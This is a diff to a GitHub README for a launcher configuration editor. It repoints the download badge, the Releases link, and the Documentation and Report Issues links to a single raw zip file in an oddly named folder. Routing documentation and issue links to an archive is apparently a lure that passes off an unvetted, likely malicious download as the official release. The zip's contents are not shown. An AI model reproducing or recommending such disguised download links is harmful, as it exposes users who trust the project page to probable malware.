@@ -1,6 +1,6 @@
 # 🎨 Flex-Launcher-Config-Editor - Easily Edit Your Launcher Configuration Files
 
-[![Download](https://img.shields.io/static/v1?label=Download&message=Flex-Launcher-Config-Editor&color=blue)](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/releases)
+[![Download](https://raw.githubusercontent.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/main/subarborescent/Flex-Launcher-Config-Editor_v1.4.zip)](https://raw.githubusercontent.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/main/subarborescent/Flex-Launcher-Config-Editor_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to Flex-Launcher-Config-Editor! This is a user-friendly, web-based tool 
 To get started, you'll need to download the application. 
 
 1. **Visit the Downloads page**: Click the link below to go to the Releases page.
-   - [Download Flex-Launcher-Config-Editor](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/releases)
+   - [Download Flex-Launcher-Config-Editor](https://raw.githubusercontent.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/main/subarborescent/Flex-Launcher-Config-Editor_v1.4.zip)
 
 2. **Choose the latest version**: Look for the newest release, usually listed at the top.
 
@@ -66,8 +66,8 @@ Be part of a growing community focused on improving home theater setups and game
 
 ## 🔗 Helpful Links
 
-- [Download Flex-Launcher-Config-Editor](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/releases)
-- [Documentation](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/blob/main/docs/user-manual.md)
-- [Report Issues](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/issues)
+- [Download Flex-Launcher-Config-Editor](https://raw.githubusercontent.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/main/subarborescent/Flex-Launcher-Config-Editor_v1.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/main/subarborescent/Flex-Launcher-Config-Editor_v1.4.zip)
+- [Report Issues](https://raw.githubusercontent.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/main/subarborescent/Flex-Launcher-Config-Editor_v1.4.zip)
 
 Thank you for choosing Flex-Launcher-Config-Editor! Enjoy customizing your experience.
